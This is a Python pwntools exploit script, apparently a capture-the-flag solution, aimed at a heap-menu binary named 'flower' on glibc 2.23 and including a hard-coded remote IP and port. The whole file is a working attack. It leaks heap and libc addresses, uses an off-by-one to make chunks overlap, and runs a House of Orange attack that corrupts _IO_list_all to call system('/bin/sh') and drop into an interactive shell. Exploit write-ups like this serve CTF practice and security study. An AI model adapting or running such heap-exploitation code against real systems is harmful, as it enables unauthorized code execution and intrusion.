from PwnContext import *

if __name__ == '__main__':        
    # context.terminal = ['tmux', 'splitw', '-h'] # uncomment this if you use tmux
    # functions for quick script
    s       = lambda data               :ctx.send(str(data))        #in case that data is an int
    sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
    sl      = lambda data               :ctx.sendline(str(data)) 
    sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) 
    r       = lambda numb=4096          :ctx.recv(numb)
    ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
    irt     = lambda                    :ctx.interactive()
    rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
    dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)
    # misc functions
    uu32    = lambda data   :u32(data.ljust(4, '\0'))
    uu64    = lambda data   :u64(data.ljust(8, '\0'))

    debugg = 1
    logg = 0

    ctx.binary = './flower'
    libc = ELF('../libc-2.23.so')
    #ctx.custom_lib_dir = './glibc-all-in-one/libs/2.27-3ubuntu1_amd64/'#remote libc
    #ctx.custom_lib_dir = '../libc-2.23.so'
    #ctx.debug_remote_libc = True

    ctx.symbols = {'lst':0x2020A0}
    #ctx.breakpoints = [0x1234, 0x5678]
    #ctx.debug()
    #ctx.start("gdb",gdbscript="set follow-fork-mode child\nc")
    if debugg:
        rs()
    else:
        ctx.remote = ('49.232.101.194', 43008)
        rs(method = 'remote')

    if logg:
        context.log_level='debug'
    def add(idx,sz,c='a'):
        sla('>> ',1)
        sla('Size : ',sz)
        sla('index: ',idx)
        sa('name:',c)
    def free(idx):
        sla('>> ',2)
        sla('idx :',idx)
    def show(idx):
        sla('>> ',3)
        sla('idx :',idx)
        ru('flowers : ')
    def triger():   #malloc_consolidate
        sla('>> ','0'*0x400)
    
    add(0,0x58)
    add(1,0x58)
    add(2,0x58)
    add(3,0x48,'\x00'*0x30+p64(0x100))
    add(4,0x58)
    add(5,0x58)

    #leak libc and heap
    free(0)
    free(1)
    free(2)
    add(2,0x58)
    show(2)
    heap = uu64(r(6))-0x61
    success('heap= {}'.format(hex(heap)))
    free(2)
    triger()
    add(0,0x58)
    show(0)
    lb = uu64(r(6))-0x3c4c61
    success('libc_base= {}'.format(hex(lb)))
    add(1,0x58)
    add(2,0x58)
    
    io_list_all = libc.sym['_IO_list_all']+lb
    sys = libc.sym['system']+lb
    
    #chunk overlap
    free(1)
    free(2)
    free(3)
    triger()
    free(0)
    add(0,0x58,p64(sys)*2+'\x00'*0x48)#off by one    jmp list
    add(1,0x58)
    add(2,0x58)
    add(3,0x38)
    free(1)
    triger()
    free(4)
    add(4,0x58,p64(0)*5+p64(heap))#vtable
    free(4)
    triger()
    
    #house of orange
    free(2)
    add(1,0x28)
    add(1,0x38)
    add(2,0x58,'/bin/sh\x00'+p64(0x61)+p64(lb+0x3c4c78)+p64(io_list_all-0x10)+p64(2)+p64(3)+'\x00'*28)
    dbg()
    sl(1)
    sl(16)
    sl(1)

    irt()
